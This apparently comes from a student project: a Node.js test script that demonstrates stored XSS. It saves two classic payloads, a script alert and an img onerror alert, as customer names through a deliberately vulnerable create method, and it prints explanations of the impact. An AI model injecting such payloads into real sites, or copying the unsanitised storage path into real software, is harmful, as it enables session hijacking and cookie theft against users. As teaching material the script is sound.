// Import the customer model
const customerModel = require('../models/customer-model');

/**
 * Test function to demonstrate Stored XSS vulnerability
 */
async function testXssVulnerability() {
  console.log('=====================================');
  console.log('TESTING STORED XSS VULNERABILITY');
  console.log('=====================================');
  console.log('This test demonstrates how Stored XSS attacks can be performed');   
  console.log('through the customer management functionality (Part A, Section 4)');
  console.log('\n');

  // Generate a unique email to avoid duplicate key errors
  const uniqueEmail = `xss.test${Date.now()}@example.com`;
  
  //html encoder - we maybe need this to the function 
  // Test case 1: Simple script XSS payload
  try {
    console.log('STEP 1: Creating a customer with an XSS payload in the first name');
    const xssPayload = "<script>alert(''XSS Attack!'')</script>";
    console.log(`XSS Payload: ${xssPayload}`);
    console.log('This JavaScript code would execute in the browser when displayed');
    console.log('\n');
    
    console.log('Using vulnerable method to create customer...');
    const customerData = {
      firstName: xssPayload,
      lastName: 'Victim',
      email: uniqueEmail,
      phone: '555-123-4567',
      address: '123 Vulnerable St',
      package: 'XSS 50 Mbps'
    };
    
    const result = await customerModel.createCustomerVulnerable(customerData);
    
    if (result.success) {
      console.log(`Customer created successfully with ID: ${result.customerId}`);
      console.log('XSS payload has been stored in the database');
      console.log('When this customer record is displayed on the website, the script will execute');
    } else {
      console.log(`Error creating customer: ${result.error}`);
    }
  } catch (error) {
    console.error('Error creating customer with XSS payload:', error.message);
  }
  
  console.log('\n');
  
  // Test case 2: Alternative XSS payload using img tag
  try {
    console.log('STEP 2: Testing with an alternative XSS payload');
    const alternativeEmail = `xss.test.simple${Date.now()}@example.com`;
    const imgXssPayload = "<img src=x onerror=alert(1)>";
    console.log(`Alternative XSS Payload: ${imgXssPayload}`);
    console.log('This will trigger when the browser tries to load the non-existent image');
    console.log('\n');
    
    const customerData = {
      firstName: imgXssPayload,
      lastName: 'Victim2',
      email: alternativeEmail,
      phone: '555-123-4567',
      address: '123 Vulnerable St',
      package: 'XSS 100 Mbps'
    };
    
    const result = await customerModel.createCustomerVulnerable(customerData);
    
    if (result.success) {
      console.log(`Customer created successfully with ID: ${result.customerId}`);
      console.log('Alternative XSS payload has been stored in the database');
    } else {
      console.log(`Error with alternative XSS payload: ${result.error}`);
    }
  } catch (error) {
    console.error('Error with alternative XSS payload:', error.message);
  }
  
  //REMOVE THIS (THIS IS AN EXPLAINATION FOR US)
  console.log('\n');
  console.log('STEP 3: Impact of XSS vulnerability (conceptual explanation)');
  console.log('When user input containing JavaScript is stored in the database and then displayed:');
  console.log('- The JavaScript code executes in the browser of anyone viewing the data');
  console.log('- Attackers can steal cookies, hijack sessions, or redirect users to malicious sites');
  console.log('- The attack appears to come from your website, so users trust it');
  console.log('\n');
  
  
  console.log('==============================');
  console.log('XSS VULNERABILITY TEST COMPLETED');
  console.log('==============================');
}

// Run the test
testXssVulnerability()
  .then(() => {
    console.log('XSS test completed successfully.');
    process.exit(0);
  })
  .catch((error) => {
    console.error('Error running XSS test:', error);
    process.exit(1);
  });